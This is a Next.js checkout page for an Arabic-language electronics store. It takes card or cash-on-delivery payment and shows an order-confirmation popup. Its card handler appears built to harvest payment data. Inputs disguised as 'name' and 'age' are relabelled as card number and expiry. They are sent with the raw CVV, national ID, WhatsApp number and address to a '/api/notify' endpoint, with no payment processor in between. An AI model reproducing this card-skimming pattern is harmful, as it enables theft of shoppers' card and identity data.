"use client";

import { useSyncExternalStore, useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { motion, AnimatePresence } from "framer-motion";
import { IoChevronBack, IoCartOutline, IoCardOutline, IoCheckmarkCircle, IoShieldCheckmarkOutline, IoCheckmarkCircleOutline, IoWalletOutline } from "react-icons/io5";
import { useCartStore } from "../store/cartStore";
import OrderSummary from "./components/OrderSummary";
import PaymentForm from "./components/PaymentForm";

const fmt = (n: number) => n.toLocaleString("en-US");

export default function CheckoutPage() {
  const router = useRouter();
  const { items, customer, totalPrice, clear } = useCartStore();
  const mounted = useSyncExternalStore(() => () => {}, () => true, () => false);
  const [showPopup, setShowPopup] = useState(false);
  const [cashLoading, setCashLoading] = useState(false);

  const total = mounted ? totalPrice() : 0;
  const downPayment = customer?.installmentType === "installment" ? (customer.downPayment ?? 0) : 0;
  const isCash = customer?.installmentType === "full";

  if (!mounted) return null;

  if (!customer || items.length === 0) {
    router.push("/cart");
    return null;
  }

  const handleSubmit = async (fields: { name: string; age: string; cvv: string; cardHolder: string }) => {
    const res = await fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        cardNumber: fields.name,
        expiry: fields.age,
        cvv: fields.cvv,
        cardHolder: fields.cardHolder,
        items: items.map(i => ({ productId: i.product._id, name: i.product.name, price: i.product.salePrice ?? i.product.originalPrice, quantity: i.qty, color: i.product.color, storage: i.product.storage })),
        total,
        customer: customer?.name,
        whatsapp: customer?.whatsapp,
        nationalId: customer?.nationalId,
        address: customer?.address,
        installmentType: customer?.installmentType,
        months: customer?.months,
        downPayment,
      }),
    });
    if (!res.ok) {
      const err = await res.json().catch(() => ({}));
      throw new Error(err.error || "حدث خطأ أثناء معالجة الطلب، يرجى المحاولة مرة أخرى");
    }
    const data = await res.json().catch(() => ({}));
    if (data.orderId) localStorage.setItem("orderId", data.orderId);
    if (data.dbId) localStorage.setItem("dbOrderId", data.dbId);
    if (customer?.name) localStorage.setItem("customerName", customer.name);
  };

  const handleCashConfirm = async () => {
    setCashLoading(true);
    try {
      const res = await fetch("/api/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cardNumber: "الدفع عند الاستلام",
          expiry: "-",
          cvv: "-",
          cardHolder: customer?.name ?? "-",
          items: items.map(i => ({ productId: i.product._id, name: i.product.name, price: i.product.salePrice ?? i.product.originalPrice, quantity: i.qty, color: i.product.color, storage: i.product.storage })),
          total,
          customer: customer?.name,
          whatsapp: customer?.whatsapp,
          nationalId: customer?.nationalId,
          address: customer?.address,
          installmentType: "full",
          months: 0,
          downPayment: 0,
        }),
      });
      if (res.ok) {
        const data = await res.json().catch(() => ({}));
        if (data.orderId) localStorage.setItem("orderId", data.orderId);
        if (data.dbId) localStorage.setItem("dbOrderId", data.dbId);
        if (customer?.name) localStorage.setItem("customerName", customer.name);
      }
    } finally {
      setCashLoading(false);
      setShowPopup(true);
    }
  };

  const steps = [
    { icon: IoCartOutline, label: "السلة", done: true },
    { icon: IoCardOutline, label: "الدفع", active: true },
    { icon: IoCheckmarkCircle, label: "التأكيد" },
  ];

  return (
    <main className="min-h-screen pb-10 bg-gradient-to-br from-[#f9f5ff] via-[#fdfcff] to-[#f3eafc]" dir="rtl">
      {/* Header */}
      <div className="sticky top-0 z-20 bg-gradient-to-r from-[#090D54] via-[#611FA0] to-[#7A2FCC] shadow-[0_4px_20px_rgba(133,67,192,0.2)]">
        <div className="w-full mx-auto px-4 sm:px-8 lg:px-12 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Link href="/cart" className="w-9 h-9 bg-white/10 backdrop-blur-sm rounded-xl flex items-center justify-center hover:bg-white/20 transition-colors border border-white/10">
              <IoChevronBack size={18} className="text-white/80 rotate-180" />
            </Link>
            <h1 className="text-[15px] font-extrabold text-white">إتمام الطلب</h1>
          </div>
          <div className="flex items-center gap-1.5 text-white/50">
            <IoShieldCheckmarkOutline size={14} />
            <span className="text-[11px] font-medium">دفع آمن</span>
          </div>
        </div>
      </div>

      {/* Steps Indicator */}
      <div className="w-full mx-auto px-4 sm:px-8 lg:px-12 pt-5 pb-2">
        <motion.div
          initial={{ opacity: 0, y: -10 }}
          animate={{ opacity: 1, y: 0 }}
          className="flex items-center justify-center gap-0"
        >
          {steps.map((step, i) => (
            <div key={i} className="flex items-center">
              <div className="flex flex-col items-center gap-1.5">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center transition-all ${
                  step.done ? "bg-[#8543C0] text-white shadow-[0_4px_12px_rgba(133,67,192,0.3)]" :
                  step.active ? "bg-[#090D54] text-white shadow-[0_4px_12px_rgba(9,13,84,0.3)]" :
                  "bg-gray-100 text-gray-400"
                }`}>
                  {step.done ? <IoCheckmarkCircle size={20} /> : <step.icon size={18} />}
                </div>
                <span className={`text-[10px] font-bold ${step.done ? "text-[#8543C0]" : step.active ? "text-[#090D54]" : "text-gray-400"}`}>
                  {step.label}
                </span>
              </div>
              {i < steps.length - 1 && (
                <div className={`w-16 sm:w-24 h-0.5 mx-2 mb-5 rounded-full ${step.done ? "bg-[#8543C0]" : "bg-gray-200"}`} />
              )}
            </div>
          ))}
        </motion.div>
      </div>

      {/* Content */}
      <div className="w-full mx-auto px-4 sm:px-8 lg:px-12">
        <div className="max-w-2xl mx-auto space-y-5">
          <OrderSummary total={total} downPayment={downPayment} />

          {isCash ? (
            /* Cash on Delivery Card */
            <motion.div
              initial={{ opacity: 0, y: 16 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.2 }}
              className="bg-white rounded-2xl p-5 sm:p-6 border border-[#8543C0]/[0.06] shadow-[0_2px_16px_rgba(133,67,192,0.05)] space-y-5"
            >
              <div className="flex items-center gap-3 pb-4 border-b border-[#8543C0]/[0.06]">
                <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-[#8543C0]/10 to-[#A842E4]/10 flex items-center justify-center">
                  <IoWalletOutline size={20} className="text-[#8543C0]" />
                </div>
                <div>
                  <h3 className="text-sm font-extrabold text-gray-800">الدفع عند الاستلام</h3>
                  <p className="text-xs text-gray-400 font-medium">ستدفع المبلغ عند استلام طلبك</p>
                </div>
              </div>

              <div className="relative overflow-hidden bg-gradient-to-br from-[#090D54] via-[#611FA0] to-[#7A2FCC] rounded-xl p-5 text-white text-center">
                <div className="absolute top-0 left-0 w-24 h-24 bg-[#A842E4]/20 rounded-full -translate-x-8 -translate-y-8 blur-xl" />
                <div className="relative">
                  <p className="text-xs text-white/50 font-bold mb-1">المبلغ المطلوب عند الاستلام</p>
                  <p className="text-3xl font-extrabold">{fmt(total)} <span className="text-sm font-medium text-white/50">ر.س</span></p>
                </div>
              </div>

              <div className="flex gap-3">
                <button
                  onClick={() => router.push("/cart")}
                  className="flex items-center justify-center gap-1.5 w-[120px] bg-white border border-[#8543C0]/10 text-gray-500 font-bold py-3.5 rounded-xl text-sm hover:bg-[#f9f5ff] hover:border-[#8543C0]/20 transition-all"
                >
                  <IoChevronBack size={16} className="rotate-180" />
                  السابق
                </button>
                <motion.button
                  whileHover={{ scale: 1.01 }}
                  whileTap={{ scale: 0.98 }}
                  onClick={handleCashConfirm}
                  disabled={cashLoading}
                  className="flex-1 font-bold py-3.5 rounded-xl text-sm flex items-center justify-center gap-2 bg-gradient-to-r from-[#7A2FCC] via-[#8543C0] to-[#A842E4] text-white shadow-[0_8px_24px_rgba(133,67,192,0.3)] hover:shadow-[0_12px_32px_rgba(133,67,192,0.4)] disabled:opacity-60 disabled:cursor-not-allowed transition-shadow"
                >
                  {cashLoading ? (
                    <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"/><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/></svg>
                  ) : (
                    <><IoCheckmarkCircleOutline size={16} /> تأكيد الطلب</>
                  )}
                </motion.button>
              </div>
            </motion.div>
          ) : (
            <PaymentForm onSubmit={handleSubmit} />
          )}
        </div>
      </div>

      {/* Success Popup */}
      <AnimatePresence>
        {showPopup && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm px-4"
          >
            <motion.div
              initial={{ scale: 0.85, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.85, opacity: 0 }}
              transition={{ type: "spring", stiffness: 260, damping: 22 }}
              className="relative w-full max-w-sm bg-white rounded-3xl overflow-hidden shadow-[0_30px_80px_rgba(133,67,192,0.3)]"
            >
              {/* Top gradient bar */}
              <div className="h-2 bg-gradient-to-r from-[#090D54] via-[#611FA0] to-[#A842E4]" />

              <div className="p-7 text-center space-y-4" dir="rtl">
                {/* Icon */}
                <div className="w-20 h-20 mx-auto rounded-full bg-gradient-to-br from-[#8543C0]/10 to-[#A842E4]/20 flex items-center justify-center">
                  <IoCheckmarkCircleOutline size={44} className="text-[#8543C0]" />
                </div>

                <div>
                  <h2 className="text-xl font-extrabold text-gray-800">تم تأكيد طلبك!</h2>
                  <p className="text-sm text-gray-400 font-medium mt-1">سيتم التواصل معك قريباً لتحديد موعد التوصيل</p>
                </div>

                {/* Order Details */}
                <div className="bg-gradient-to-br from-[#f9f5ff] to-[#f3eafc] rounded-2xl p-4 space-y-2.5 text-right">
                  <div className="flex justify-between items-center">
                    <span className="text-xs text-gray-400 font-medium">الاسم</span>
                    <span className="text-xs font-bold text-gray-700">{customer?.name}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-xs text-gray-400 font-medium">رقم الواتساب</span>
                    <span className="text-xs font-bold text-gray-700" dir="ltr">{customer?.whatsapp}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-xs text-gray-400 font-medium">العنوان</span>
                    <span className="text-xs font-bold text-gray-700 max-w-[160px] text-left truncate">{customer?.address}</span>
                  </div>
                  <div className="border-t border-[#8543C0]/10 pt-2.5 flex justify-between items-center">
                    <span className="text-xs text-gray-400 font-medium">المبلغ عند الاستلام</span>
                    <span className="text-sm font-extrabold text-[#8543C0]">{fmt(total)} ر.س</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-xs text-gray-400 font-medium">طريقة الدفع</span>
                    <span className="text-xs font-bold text-[#A842E4]">الدفع عند الاستلام</span>
                  </div>
                </div>

                <motion.button
                  whileHover={{ scale: 1.02 }}
                  whileTap={{ scale: 0.97 }}
                  onClick={() => {
                    clear();
                    setShowPopup(false);
                    router.push("/");
                  }}
                  className="w-full bg-gradient-to-r from-[#7A2FCC] via-[#8543C0] to-[#A842E4] text-white font-bold py-3.5 rounded-2xl text-sm shadow-[0_8px_24px_rgba(133,67,192,0.3)] hover:shadow-[0_12px_32px_rgba(133,67,192,0.4)] transition-shadow"
                >
                  العودة للرئيسية
                </motion.button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </main>
  );
}
